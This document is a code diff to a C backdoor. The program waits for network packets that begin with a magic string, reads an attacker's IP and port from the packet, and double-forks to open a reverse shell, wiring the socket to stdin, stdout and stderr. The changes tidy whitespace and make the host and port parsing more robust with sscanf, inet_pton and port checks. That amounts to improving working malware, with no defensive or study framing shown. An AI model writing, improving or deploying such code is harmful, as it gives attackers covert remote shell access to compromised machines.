@@ -46,9 +46,9 @@ void sig_term(int sig) {
 int main(int argc, char *argv[]) {
 	int sd, pkt_size;
 	char *buf;
-        unsigned int opts = 0;
+	unsigned int opts = 0;
 
-        while (1) {
+	while (1) {
 		int opt_idx;
 		// important: order of args must align with opts mask
 		static struct option long_options[] = {
@@ -119,55 +119,26 @@ listen_loop:
 		// check for magic byte sequence
 		if (data_sz > strlen(MAGIC_STR)
 		    && strncmp(data, MAGIC_STR, strlen(MAGIC_STR)) == 0) {
-			int i;
-			char host[20];
-			char port[20];
-			const size_t max_len = 20;
-
-			// skip over magic
-			data += strlen(MAGIC_STR);
-			data_sz -= strlen(MAGIC_STR);
-
-			// read IP
-			for (i=0; data[i] != ':'; i++) {
-				// don't overrun the buffer
-				if (i >= max_len) {
-					fprintf(stderr, "error: payload dest address (too long)\n");
-					goto listen_loop;
-				}
-
-				// ensure data is formatted OK
-				if (data[i] != '.' && !(data[i] >= '0' && data[i] <= '9')) {
-					fprintf(stderr, "error: payload bad format\n");
-					goto listen_loop;
-				}
-
-				host[i] = data[i];
+			char host_str[INET_ADDRSTRLEN]; // Increased buffer for IP address
+			int port_num;
+			
+			// skip over magic and parse host:port
+			// Use INET_ADDRSTRLEN-1 to leave space for null terminator in sscanf's %s
+			if (sscanf(data + strlen(MAGIC_STR), "%15[^:]:%d", host_str, &port_num) != 2) {
+				fprintf(stderr, "error: payload bad format or invalid host/port\n");
+				goto listen_loop;
 			}
-			host[i] = 0;
 
-			// skip :
-			data += i + 1;
-			data_sz -= i + 1;
-
-			// read port number
-			for (i=0; data[i] != 0; i++) {
-				if (i >= max_len) {
-					fprintf(stderr, "error: payload format (too long)\n");
-					goto listen_loop;
-				}
-				if (data[i] < '0' || data[i] > '9') {
-					fprintf(stderr, "error: payload port format\n");
-					goto listen_loop;
-				}
-				port[i] = data[i];
+			// Validate port number
+			if (port_num <= 0 || port_num > 65535) {
+				fprintf(stderr, "error: payload invalid port number: %d\n", port_num);
+				goto listen_loop;
 			}
-			port[i] = 0;
 
 			// fork a child for reverse shell
 			if (fork() == 0) {
 				if (fork() != 0) exit(0); // double fork to reparent
-				reverse_shell(host, atoi(port));
+				reverse_shell(host_str, port_num);
 				exit(0);
 			}
 		}
@@ -216,11 +187,15 @@ void reverse_shell(char *host, int port) {
 	struct sockaddr_in cnc;
 
 	sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-   
+
 	memset((char *)&cnc, 0, sizeof(cnc));
 	cnc.sin_family = AF_INET;
 	cnc.sin_port = htons(port);
-	cnc.sin_addr.s_addr = inet_addr(host);
+	// Use inet_pton instead of inet_addr
+	if (inet_pton(AF_INET, host, &cnc.sin_addr) <= 0) {
+		fprintf(stderr, "error: invalid address for host %s\n", host);
+		return; // Or exit, depending on desired behavior
+	}
 
 	fprintf(stderr, "connecting to %s:%i\n", host, port);
 	int r = connect(sd, (struct sockaddr *) &cnc, sizeof(cnc));
@@ -228,7 +203,7 @@ void reverse_shell(char *host, int port) {
 		fprintf(stderr, "error: %s\n", strerror(errno));
 		return;
 	}
-    
+
 	dup2(sd, 0);
 	dup2(sd, 1);
 	dup2(sd, 2);
